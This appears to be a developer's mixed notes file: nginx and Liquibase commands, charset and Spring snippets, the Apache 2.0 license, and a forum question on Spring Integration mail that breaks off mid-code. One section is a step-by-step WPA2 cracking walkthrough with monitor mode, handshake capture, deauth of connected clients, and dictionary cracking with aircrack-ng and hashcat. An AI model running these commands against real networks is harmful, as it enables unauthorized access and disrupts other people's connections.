--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
#### NGINX
--------------------------------------------------------------------------------------------------------
service nginx stop
systemctl stop nginx

killall -9 nginx

service nginx quit
systemctl quit nginx

service nginx reload
systemctl reload nginx

nginx -t
service nginx configtest
systemctl config nginx

service nginx -V
systemctl -V nginx
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
#### HTTPD
--------------------------------------------------------------------------------------------------------
sudo service httpd start
​sudo service httpd stop
​sudo service httpd restart
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
#### Liquibase
--------------------------------------------------------------------------------------------------------
UPDATE DATABASECHANGELOGLOCK SET LOCKED=FALSE, LOCKGRANTED=null, LOCKEDBY=null where ID=1;
DELETE FROM DATABASECHANGELOGLOCK;
Drop DATABASE DATABASECHANGELOGLOCK;

<changeSet author="user" id="123">
  <preConditions onFail="CONTINUE">
    <not><sequenceExists sequenceName="SEQUENCE_NAME_SEQ" /></not>
  </preConditions>
  <createSequence sequenceName="SEQUENCE_NAME_SEQ"/>
</changeSet>

  <changeSet author="user" id="123">
  <preConditions onFail="CONTINUE">
          <sqlCheck expectedResult="0">
            select count(*) from user_sequences where sequence_name = 'SEQUENCE_NAME_SEQ';
          </sqlCheck>
  </preConditions>
  <createSequence sequenceName="SEQUENCE_NAME_SEQ"/>
</changeSet>

java -jar liquibase.jar --changeLogFile="./data/<insert file name> " --diffTypes="data" generateChangeLog

liquibase --changeLogFile=mydb.xml generateChangeLog
liquibase --changeLogFile=mydb.xml changelogSync
liquibase --changeLogFile=mydb.xml update
--------------------------------------------------------------------------------------------------------
<changeSet author="e-ballo" id="DropViewsAndcreateSynonyms" context="dev,int,uat,prod">
    <preConditions onFail="CONTINUE" >
        <viewExists viewName="PMV_PACKAGE_ITEMS" schemaName="ZON"/>
        <viewExists viewName="PMV_SUBSPLAN_INSTALLTYPES" schemaName="ZON"/>
    </preConditions>
    <dropView schemaName="ZON" viewName="PMV_PACKAGE_ITEMS"  />
    <dropView schemaName="ZON" viewName="PMV_SUBSPLAN_INSTALLTYPES"  />
    <sqlFile path="environment-synonyms.sql" relativeToChangelogFile="true" splitStatements="true" stripComments="true"/>
</changeSet>
--------------------------------------------------------------------------------------------------------
Standard Migrator Run
java -jar liquibase.jar \
      --driver=oracle.jdbc.OracleDriver \
      --classpath=\path\to\classes:jdbcdriver.jar \
      --changeLogFile=com/example/db.changelog.xml \
      --url="jdbc:oracle:thin:@localhost:1521:oracle" \
      --username=scott \
      --password=tiger \
      update
Run Migrator pulling changelogs from a .WAR file
java -jar liquibase.jar \
      --driver=oracle.jdbc.OracleDriver \
      --classpath=website.war \
      --changeLogFile=com/example/db.changelog.xml \
      --url=jdbc:oracle:thin:@localhost:1521:oracle \
      --username=scott \
      --password=tiger \
      update
Run Migrator pulling changelogs from an .EAR file
java -jar liquibase.jar \
      --driver=oracle.jdbc.OracleDriver \
      --classpath=application.ear \
      --changeLogFile=com/example/db.changelog.xml \
      --url=jdbc:oracle:thin:@localhost:1521:oracle \
      --username=scott \
      --password=tiger
Don’t execute changesets, save SQL to /tmp/script.sql
java -jar liquibase.jar \
        --driver=oracle.jdbc.OracleDriver \
        --classpath=jdbcdriver.jar \
        --url=jdbc:oracle:thin:@localhost:1521:oracle \
        --username=scott \
        --password=tiger \
        updateSQL > /tmp/script.sql
List locks on the database change log
java -jar liquibase.jar \
        --driver=oracle.jdbc.OracleDriver \
        --classpath=jdbcdriver.jar \
        --url=jdbc:oracle:thin:@localhost:1521:oracle \
        --username=scott \
        --password=tiger \
        listLocks
Add url parameters useUnicode=true and characterEncoding=UTF-8 to set character encoding to utf8.
--------------------------------------------------------------------------------------------------------
brew cask install pennywise
--------------------------------------------------------------------------------------------------------
grep -Rw '/path/to/search/' -e 'pattern'
grep --exclude=*.csv -Rw '/path/to/search' -e 'pattern'
grep --exclude-dir={dir1,dir2,*_old} -Rw '/path/to/search' -e 'pattern'
find . -name "*.php" -exec grep "pattern" {} \;
ack 'pattern'
ack 'pattern' /path/to/file.txt
--------------------------------------------------------------------------------------------------------
# put your network device into monitor mode
airmon-ng start wlan0

# listen for all nearby beacon frames to get target BSSID and channel
airodump-ng mon0

# start listening for the handshake
airodump-ng -c 6 --bssid 9C:5C:8E:C9:AB:C0 -w capture/ mon0

# optionally deauth a connected client to force a handshake
aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0

########## crack password with aircrack-ng... ##########

# download 134MB rockyou.txt dictionary file if needed
curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

# crack w/ aircrack-ng
aircrack-ng -a2 -b 9C:5C:8E:C9:AB:C0 -w rockyou.txt capture/-01.cap

########## or crack password with naive-hashcat ##########

# convert cap to hccapx
cap2hccapx.bin capture/-01.cap capture/-01.hccapx

# crack with naive-hashcat
HASH_FILE=hackme.hccapx POT_FILE=hackme.pot HASH_TYPE=2500 ./naive-hashcat.sh

# not all clients respect broadcast deauths though
aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 mon0

# -0 2 specifies we would like to send 2 deauth packets. Increase this number
# if need be with the risk of noticeably interrupting client network activity
# -a is the MAC of the access point
# -c is the MAC of the client
aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0

# -a2 specifies WPA2, -b is the BSSID, -w is the wordfile
aircrack-ng -a2 -b 9C:5C:8E:C9:AB:C0 -w rockyou.txt hackme.cap

# download the 134MB rockyou dictionary file
curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

# download
git clone https://github.com/brannondorsey/naive-hashcat
cd naive-hashcat

# download the 134MB rockyou dictionary file
curl -L -o dicts/rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

# crack ! baby ! crack !
# 2500 is the hashcat hash mode for WPA/WPA2
HASH_FILE=hackme.hccapx POT_FILE=hackme.pot HASH_TYPE=2500 ./naive-hashcat.sh

cap2hccapx.bin hackme.cap hackme.hccapx

# replace -c and --bssid values with the values of your target network
# -w specifies the directory where we will save the packet capture
airodump-ng -c 3 --bssid 9C:5C:8E:C9:AB:C0 -w . mon0

airodump-ng -c [channel] --bssid [bssid] -w /root/Desktop/ [monitor interface]
aireplay-ng –0 2 –a [router bssid] –c [client bssid] mon0
aircrack-ng -a2 -b [router bssid] -w [path to wordlist] /root/Desktop/*.cap
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
#### ROUTE
--------------------------------------------------------------------------------------------------------
route add 10.1.1.140 netmask 255.255.255.255 <defaultGW> -P
route print
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
#### MISC
--------------------------------------------------------------------------------------------------------
    Cp1251:
        Windows-1251 
    Cp866:
        IBM866
        IBM-866
        866
        CP866
        CSIBM866 
    KOI8_R:
        KOI8-R
        KOI8
        CSKOI8R 
    ISO8859_5:
        ISO8859-5
        ISO-8859-5
        ISO_8859-5
        ISO_8859-5:1988
        ISO-IR-144
        8859_5
        Cyrillic
        CSISOLatinCyrillic
        IBM915
        IBM-915
        Cp915
        915 
--------------------------------------------------------------------------------------------------------
CREATE DATABASE 'E:\ProjectHolding\DataBase\HOLDING.GDB' PAGE_SIZE 4096
DEFAULT CHARACTER SET UNICODE_FSS;

CREATE TABLE RUSSIAN_WORD
(
 "NAME1"  VARCHAR(40) CHARACTER SET UNICODE_FSS NOT NULL,
 "NAME2"  VARCHAR(40) CHARACTER SET WIN1251 NOT NULL,
 PRIMARY KEY ("NAME1")
);
--------------------------------------------------------------------------------------------------------
import java.util.Properties;

import javax.mail.Session;
import javax.mail.Message;
import javax.mail.Transport;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.InternetAddress;

public class MailTest
{
 static final String ENCODING = "koi8-r";
 static final String FROM = "myaccount@mydomail.ru";
 static final String TO = "myaccount@mydomail.ru";

 public static void main(String args[]) throws Exception
 {
  Properties mailProps = new Properties();

  mailProps.put("mail.store.protocol","pop3");
  mailProps.put("mail.transport.protocol","smtp");
  mailProps.put("mail.user","myaccount");

  mailProps.put("mail.pop3.host","mail.mydomail.ru");
  mailProps.put("mail.smtp.host","mail.mydomail.ru");

  Session session = Session.getDefaultInstance(mailProps);

  MimeMessage message = new MimeMessage(session);
  message.setFrom(new InternetAddress(FROM));
  message.setRecipient(Message.RecipientType.TO, new InternetAddress(TO));

  message.setSubject("Тестовое письмо",ENCODING);
  message.setText("Текст тестового письма",ENCODING);

  Transport.send(message);
 }
}
--------------------------------------------------------------------------------------------------------
mode con cp select=1251
new String(mailInfo.getBody().getBytes("cp1251"), StandardCharsets.UTF_16)
javac -encoding=KOI8_R
--------------------------------------------------------------------------------------------------------
git -c diff.mnemonicprefix=false -c core.quotepath=false stash apply stash@{0}
--------------------------------------------------------------------------------------------------------
curl -i http://localhost:8080/spring-rest/ex/foos
curl -i -X POST http://localhost:8080/spring-rest/ex/foos
curl -i -H "key:val" http://localhost:8080/spring-rest/ex/foos
curl -i -d id=100 http://localhost:8080/spring-rest/ex/bars
curl -H "Accept:application/json,text/html" http://localhost:8080/spring-rest/ex/foos
curl -i -H "key1:val1" -H "key2:val2" http://localhost:8080/spring-rest/ex/foos

@RequestMapping(value = "/ex/foos", headers = "key=val", method = GET)
@ResponseBody
public String getFoosWithHeader() {
    return "Get some Foos with Header";
}

@RequestMapping(
  value = "/ex/foos", 
  method = GET, 
  headers = "Accept=application/json")
@ResponseBody
public String getFoosAsJsonFromBrowser() {
    return "Get some Foos with Header Old";
}

@RequestMapping(
  value = "/ex/foos", 
  method = GET,
  produces = { "application/json", "application/xml" }
)

@RequestMapping(value = "/ex/bars/{numericId:[\\d]+}", method = GET)
@ResponseBody
public String getBarsBySimplePathWithPathVariable(
  @PathVariable long numericId) {
    return "Get a specific Bar with id=" + numericId;
}

@RequestMapping(value = "/ex/bars", method = GET)
@ResponseBody
public String getBarBySimplePathWithRequestParam(
  @RequestParam("id") long id) {
    return "Get a specific Bar with id=" + id;
}

@RequestMapping(
  value = "/ex/bars", 
  params = { "id", "second" }, 
  method = GET)
@ResponseBody
public String getBarBySimplePathWithExplicitRequestParams(
  @RequestParam("id") long id) {
    return "Narrow Get a specific Bar with id=" + id;
}

@RequestMapping(
  value = { "/ex/advanced/bars", "/ex/advanced/foos" }, 
  method = GET)
@ResponseBody
public String getFoosOrBarsByPath() {
    return "Advanced - Get some Foos or Bars";
}

@RequestMapping(
  value = "/ex/foos/multiple", 
  method = { RequestMethod.PUT, RequestMethod.POST }
)
@ResponseBody
public String putAndPostFoos() {
    return "Advanced - PUT and POST within single method";
}

@RequestMapping(value = "*", method = RequestMethod.GET)
@ResponseBody
public String getFallback() {
    return "Fallback for GET Requests";
}

@RequestMapping(
  value = "*", 
  method = { RequestMethod.GET, RequestMethod.POST ... })
@ResponseBody
public String allFallback() {
    return "Fallback for All Requests";
}

@GetMapping(value = "foos/duplicate", produces = MediaType.APPLICATION_XML_VALUE)
public String duplicate() {
    return "Duplicate";
}
 
@GetMapping(value = "foos/duplicate", produces = MediaType.APPLICATION_JSON_VALUE)
public String duplicateEx() {
    return "Duplicate";
}
--------------------------------------------------------------------------------------------------------
gradle install -Dmaven.repo.local=the/path/of/the/folder
--------------------------------------------------------------------------------------------------------

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding those notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. We also recommend that a
      file or class name and description of purpose be included on the
      same "printed page" as the copyright notice for easier
      identification within third-party archives.

   Copyright [yyyy] [name of copyright owner]

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
--------------------------------------------------------------------------------------------------------
PeriodFormat.space=\u0020
PeriodFormat.comma=,
PeriodFormat.commandand=,\u0438
PeriodFormat.commaspaceand=, \u0438
PeriodFormat.commaspace=,\u0020
PeriodFormat.spaceandspace=\ \u0438\u0020
PeriodFormat.regex.separator=%
PeriodFormat.years.regex=^1$%[0-9]*(?<!1)[2-4]$%[0-9]*
PeriodFormat.years.list=\ \u0433\u043E\u0434%\ \u0433\u043E\u0434\u0430%\ \u043B\u0435\u0442
PeriodFormat.months.regex=^1$%[0-9]*(?<!1)[2-4]$%[0-9]*
PeriodFormat.months.list=\ \u043C\u0435\u0441\u044F\u0446%\ \u043C\u0435\u0441\u044F\u0446\u0430%\ \u043C\u0435\u0441\u044F\u0446\u0435\u0432
PeriodFormat.weeks.regex=^1$%[0-9]*(?<!1)[2-4]$%[0-9]*
PeriodFormat.weeks.list=\ \u043D\u0435\u0434\u0435\u043B\u044F%\ \u043D\u0435\u0434\u0435\u043B\u0438%\ \u043D\u0435\u0434\u0435\u043B\u044C
PeriodFormat.days.regex=^1$%[0-9]*(?<!1)[2-4]$%[0-9]*
PeriodFormat.days.list=\ \u0434\u0435\u043D\u044C%\ \u0434\u043D\u044F%\ \u0434\u043D\u0435\u0439
PeriodFormat.hours.regex=^1$%[0-9]*(?<!1)[2-4]$%[0-9]*
PeriodFormat.hours.list=\ \u0447\u0430\u0441%\ \u0447\u0430\u0441\u0430%\ \u0447\u0430\u0441\u043E\u0432
PeriodFormat.minutes.regex=^1$%[0-9]*(?<!1)[2-4]$%[0-9]*
PeriodFormat.minutes.list=\ \u043C\u0438\u043D\u0443\u0442\u0430%\ \u043C\u0438\u043D\u0443\u0442\u044B%\ \u043C\u0438\u043D\u0443\u0442
PeriodFormat.seconds.regex=^1$%[0-9]*(?<!1)[2-4]$%[0-9]*
PeriodFormat.seconds.list=\ \u0441\u0435\u043A\u0443\u043D\u0434\u0430%\ \u0441\u0435\u043A\u0443\u043D\u0434\u044B%\ \u0441\u0435\u043A\u0443\u043D\u0434
PeriodFormat.milliseconds.regex=^1$%[0-9]*(?<!1)[2-4]$%[0-9]*
PeriodFormat.milliseconds.list=\ \u043C\u0438\u043B\u043B\u0438\u0441\u0435\u043A\u0443\u043D\u0434\u0430%\ \u043C\u0438\u043B\u043B\u0438\u0441\u0435\u043A\u0443\u043D\u0434\u044B%\ \u043C\u0438\u043B\u043B\u0438\u0441\u0435\u043A\u0443\u043D\u0434
--------------------------------------------------------------------------------------------------------
apply plugin: 'java'
 
repositories {
    mavenCentral()
}
 
dependencies {
    compile group: 'org.slf4j', name: 'slf4j-api', version: '1.7.25'
    compile group: 'org.slf4j', name: 'slf4j-simple', version: '1.7.25'
}

jar {
    manifest {
        attributes "Main-Class": "com.baeldung.fatjar.Application"
    }
 
    from {
        configurations.compile.collect { it.isDirectory() ? it : zipTree(it) }
    }
}

task customFatJar(type: Jar) {
    manifest {
        attributes 'Main-Class': 'com.baeldung.fatjar.Application'
    }
    baseName = 'all-in-one-jar'
    from { configurations.compile.collect { it.isDirectory() ? it : zipTree(it) } }
    with jar
}

buildscript {
    repositories {
        jcenter()
    }
    dependencies {
        classpath 'com.github.jengelman.gradle.plugins:shadow:2.0.1'
    }
}
 
apply plugin: 'java'
apply plugin: 'com.github.johnrengelman.shadow'
--------------------------------------------------------------------------------------------------------
POST /test/servertest.jsp HTTP/1.1
Host: center:1001
Accept-Language: en,ru-ru;q=0.8,ru;q=0.5,en-us;q=0.3
Accept-Encoding: gzip,deflate
Accept-Charset: windows-1251,utf-8;q=0.7,*;q=0.7
Content-Type: multipart/form-data; boundary=---------------------------265001916915724
Content-Length: 927
 
-----------------------------265001916915724
Content-Disposition: form-data; name="txt_1"
 
Гравитация
-----------------------------265001916915724
Content-Disposition: form-data; name="user[]"
 
 
-----------------------------265001916915724
Content-Disposition: form-data; name="user[]"
 
 
-----------------------------265001916915724
Content-Disposition: form-data; name="foto"; filename=""
Content-Type: application/octet-stream
 
 
-----------------------------265001916915724
Content-Disposition: form-data; name="pics[]"; filename=""
Content-Type: application/octet-stream
 
 
-----------------------------265001916915724
Content-Disposition: form-data; name="pics[]"; filename=""
Content-Type: application/octet-stream
 
 
-----------------------------265001916915724
Content-Disposition: form-data; name="btnsubmit"
 
Send
-----------------------------265001916915724--

IOUtils.toString(in, StandardCharsets.UTF_8);
IOUtils.toByteArray(is), charset
IOUtils.toString(mailInfo.getBody().getBytes(), StandardCharsets.US_ASCII.name);

IOUtils.toString(fileContent.getBytes("us-ascii"), "cp1251");

IOUtils.toString(fileContent.getBytes("utf-8"), "us-ascii");
--------------------------------------------------------------------------------------------------------


I am trying to add Spring Integration to a REST MVC Spring app I have been writing. I am using the latest Spring 4.2.x for core, integration and mvc. The idea is to create separate application contexts as on the Dynamic FTP example. The reason why is because I can send emails from 2 separated accounts as well as listen from 2 separated accounts hence having separate application contexts as well as environment variables to aid on bean creation for each context helps a bunch.

I apologize for the newbie questions, but I am having a hard time with the manual as well as trying to figure out how to setup SMTP email configuration class without XML.

I want to have both receive and send integration channels. All email settings will be configured from enviroment variables so I have injected the enviroment: @Autowired Environment env;

I can define:

    A MailSender bean
    A MailSendingMessageHandler bean
    A MessageChannel for the SMTP (outbound)

Now, on XML configurations you have an outbound-channel-adapter where you wire the mail-sender bean as well as the MessageChannel

My goal is to have configurations for:

    Send emails.
    Listen to IMAP emails and process them.

For sending emails, the idea is to get from a rest endpoint, calling a service and that service is what will put a message to Integration SMTP outbound channel to send an email. Looks like, by using the MailSendingMessageHandler it will get the Integration Message and convert to a Mail Message for the MailSender. I have no idea on how to wire the MailSendingMessageHandler to the outbound channel so that an email can be send. Also I do not know how to, from my @Service class that is called by the rest endpoint how to create the messages and send them through the outbound SMTP channel so emails can be send. On one rest call I send all email recipients I want to reach. Before, each email message body is properly formatted so that I can create each Integration Message (as an email) that will be handled and converted by MailSendingMessageHandler. I have tried to find examples online without success on how to accomplish this.

Any examples you could redirect me? Thanks in advance!

So far I have for the configuration:

import java.util.Properties;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.support.PropertySourcesPlaceholderConfigurer;
import org.springframework.integration.annotation.InboundChannelAdapter;
import org.springframework.integration.config.EnableIntegration;
import org.springframework.integration.annotation.Poller;
import org.springframework.integration.channel.DirectChannel;
import org.springframework.integration.channel.QueueChannel;
import org.springframework.integration.core.MessageSource;
import org.springframework.integration.mail.MailReceiver;
import org.springframework.integration.mail.MailReceivingMessageSource;
import org.springframework.integration.mail.MailSendingMessageHandler;
import org.springframework.mail.MailMessage;
import org.springframework.mail.MailSender;
import org.springframework.mail.javamail.JavaMailSenderImpl;
import org.springframework.messaging.MessageChannel;
import org.springframework.messaging.MessagingException;


import org.springframework.core.env.Environment;

@Configuration
@EnableIntegration
public class IntegrationEmailConfig {

@Autowired 
Environment env;

@Bean
public static PropertySourcesPlaceholderConfigurer pspc() {
    return new PropertySourcesPlaceholderConfigurer();
}

@Bean
@InboundChannelAdapter(value = "emailInboundChannel", poller = @Poller(fixedDelay = "5000") )
public MailReceivingMessageSource mailMessageSource(MailReceiver imapMailReceiver) {
    return new MailReceivingMessageSource(imapMailReceiver);
}

private Properties additionalMailProperties() { 
    Properties properties = new Properties();
    if (env.containsProperty("mail.smtp.auth")) {
        properties.setProperty("mail.smtp.auth",env.getProperty("mail.smtp.auth"));
    }
